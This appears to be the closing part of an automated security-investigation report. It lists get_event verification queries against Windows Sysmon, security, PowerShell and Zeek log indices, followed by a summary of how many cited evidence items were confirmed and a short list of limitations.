| q-543c3d1f7c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItThYt63"} | None |  |
| q-333950b7db | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3Z"} | None |  |
| q-3f6253d822 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTpgCep"} | None |  |
| q-942c7f6e98 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKB-"} | None |  |
| q-0f4acc6494 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKB-"} | None |  |
| q-3c4fcf6c39 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FLV1"} | None |  |
| q-ec60b2211b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FLV1"} | None |  |
| q-b7eb5d2c75 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTtmJQ5"} | None |  |
| q-bf8fd2c1d8 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZKhD3z"} | None |  |
| q-3196099943 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKB-"} | None |  |
| q-dc9c67973b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FLV1"} | None |  |
| q-23451857f9 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKB-"} | None |  |
| q-53440ebf97 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-d564ddc1e9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-55bb72351a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-23e2fde4ff | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-b1dc876f6d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-7b0fdc20fe | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-73eb33aa7e | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZLhZrj"} | None |  |
| q-ad5886ad8a | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-c5c7452519 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-454bce8c73 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-d795887901 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTqhQkl"} | None |  |
| q-53f0e62d08 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTmc1_j"} | None |  |
| q-13fc74f8cc | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRlFBP"} | None |  |
| q-71e77a206c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOhMXxP"} | None |  |
| q-d8f734d416 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZLh6MG"} | None |  |
| q-cf6aa4621b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOpVKkY"} | None |  |
| q-3c466f8436 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-56a444f224 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-225cf00c05 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-98b4a607f4 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-0e97f8c12b | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-48c8326c7b | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-4cbc058513 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-57628c48f8 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-393579a845 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-d47b023fb0 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrohz"} | None |  |
| q-9581c0861f | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-3eedafafcc | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-a5a097dfb9 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-b9ea93baeb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-7a3bd4fe52 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-cec512ef45 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-ed045beefc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-b8743bfe26 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRkUVV"} | None |  |
| q-5747d750ce | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRkUVV"} | None |  |
| q-f886fda533 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-25e9e269bb | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-6c83aaf2bf | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-da38639b38 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOaA_"} | None |  |
| q-3d47386f5e | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYiy"} | None |  |
| q-c3984f7e5e | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYiy"} | None |  |
| q-dd3db80084 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYiy"} | None |  |
| q-8e6dcb104b | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjj"} | None |  |
| q-f72a4ac844 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjj"} | None |  |
| q-010d2db3f3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-c619b467f8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-02c4a60e94 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-fbb3ddbf25 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRkUVV"} | None |  |
| q-5158c3610a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-29ca41423c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-eb2f2b741f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-0684f5e4e0 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FN5"} | None |  |
| q-ab1e23b5de | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FN5"} | None |  |
| q-c8815443f7 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rl"} | None |  |
| q-42e1466ea9 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rl"} | None |  |
| q-d1a6643f07 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-ae4efc4f0f | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-71f2cb683b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-ab811135ec | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-f202cd77a7 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-7cd4d4aa5c | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-fcc486f757 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRlVDe"} | None |  |
| q-e63c0baadf | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-277381fa96 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEGc"} | None |  |
| q-1889e9bf3f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTvoSAW"} | None |  |
| q-a0e64bfc85 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItT2v6oH"} | None |  |
| q-e61166575f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItThYt7K"} | None |  |
| q-e162f579aa | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO2iUEp"} | None |  |
| q-b6a84f6d31 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rl"} | None |  |
| q-19c647565c | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ef_w"} | None |  |
| q-d8f6447b14 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGglR"} | None |  |
| q-d82a703d4f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUGBVXT"} | None |  |
| q-8edf6060c1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbkGF"} | None |  |
| q-1bfe85ca87 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-556ddb4049 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTPA5kN"} | None |  |
| q-2c66ac1278 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPO_TIA"} | None |  |
| q-a786785ff4 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPJ5Bh7"} | None |  |
| q-2ec2235077 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQmt"} | None |  |
| q-3890096b2a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQmt"} | None |  |
| q-788c2d3c06 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQA6YzM"} | None |  |
| q-b3cdf5219b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQA6Yzb"} | None |  |
| q-b9b9172867 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_psP"} | None |  |
| q-5b4ca6867f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_psP"} | None |  |
| q-329941da79 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItKT-VVW"} | None |  |
| q-5e0136395c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItKT-VVW"} | None |  |
| q-9d38f15c64 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB7l0w"} | None |  |
| q-d0e869ad2c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB7l0w"} | None |  |

## Verification

Evidence items cited: 199; confirmed against the stored events: 197; rejected: 2. Each item was re-fetched with get_event; it is confirmed only if the event exists, the cited field holds the cited value, and the cited query_id is a query of this run that returned that event.
Evidence sent back to the agents for correction during the run: 4 item(s) in 2 submission(s) (one correction round each; what still failed was rejected).

## Limitations

- Findings describe what the stored logs show; activity these sources did not log cannot be seen.
- Datasets with non-overlapping time windows (see Data examined) were analysed separately.
- Long field values are shortened in this report; full events are retrievable by _index/_id.
